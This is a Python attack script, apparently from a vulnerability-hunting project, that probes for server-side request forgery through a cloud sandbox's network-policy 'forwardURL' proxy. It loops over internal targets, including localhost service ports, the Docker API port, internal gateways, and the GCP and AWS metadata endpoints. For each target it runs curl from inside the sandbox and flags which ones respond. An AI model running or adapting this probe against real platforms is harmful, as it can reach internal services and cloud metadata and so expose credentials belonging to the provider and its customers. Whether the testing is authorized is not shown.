# -*- coding: utf-8 -*-
"""Phase22: forwardURL 代理端 SSRF 全目标扫描 - 本机/内网/特殊域名"""
import sys, time, re, json
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
from fw_driver import api, cmd, TEAM, fresh_sandbox_deny_all

GUEST = r'''
import subprocess
def curl(args):
    r = subprocess.run(['curl', '-s', '-m', '8', '-k'] + args, capture_output=True, text=True)
    print('---', flush=True)
    print('RC=%d OUT:%s' % (r.returncode, r.stdout[:300].replace(chr(10),' ')), flush=True)
curl(['https://api.vercel.com/'])
print('done', flush=True)
'''
code = "cat > /tmp/pg30.py <<'PYEOF'\n" + GUEST + "\nPYEOF\npython3 /tmp/pg30.py"

if __name__ == "__main__":
    sid = fresh_sandbox_deny_all("fwtest10")
    time.sleep(2)

    targets = [
        ("localhost-443", "https://127.0.0.1/"),
        ("localhost-8080", "https://127.0.0.1:8080/"),
        ("localhost-8443", "https://127.0.0.1:8443/"),
        ("localhost-3000", "https://127.0.0.1:3000/"),
        ("localhost-80", "https://127.0.0.1:80/"),
        ("localhost-5432", "https://127.0.0.1:5432/"),
        ("localhost-53", "https://127.0.0.1:53/"),
        ("localhost-2222", "https://127.0.0.1:2222/"),
        ("localhost-2375", "https://127.0.0.1:2375/"),
        ("dns-443", "https://172.31.0.2/"),
        ("dns-53", "https://172.31.0.2:53/"),
        ("gw-443", "https://100.64.0.1/"),
        ("v6-local", "https://[::1]/"),
        ("gcp-meta", "https://metadata.google.internal/computeMetadata/v1/"),
        ("docker-host", "https://host.docker.internal/"),
        ("docker-gw", "https://gateway.docker.internal/"),
        ("zero-443", "https://0.0.0.0/"),
        ("meta-80", "https://169.254.169.254:80/"),
        ("ctrl-httpbin", "https://httpbin.org/anything"),
    ]
    for label, fwd in targets:
        body = {"allow": {"api.vercel.com": [{"match": {"path": {"startsWith": "/"}}, "forwardURL": fwd}]}}
        c, r = api("POST", "/v2/sandboxes/sessions/%s/network-policy?teamId=%s" % (sid, TEAM), body)
        if c != 200:
            print('[%s] set -> %d %s' % (label, c, r[:110]), flush=True)
            continue
        time.sleep(1)
        c, r = cmd(sid, "bash", ["-lc", code], timeout_ms=45000)
        outs = re.findall(r'RC=\d+ OUT:([^\x00]{0,400})', r)
        for o in outs:
            mark = 'HIT' if 'Bad Gateway' not in o else 'miss'
            print('[%s] %s: %s' % (label, mark, o[:260]), flush=True)
    print('done', flush=True)
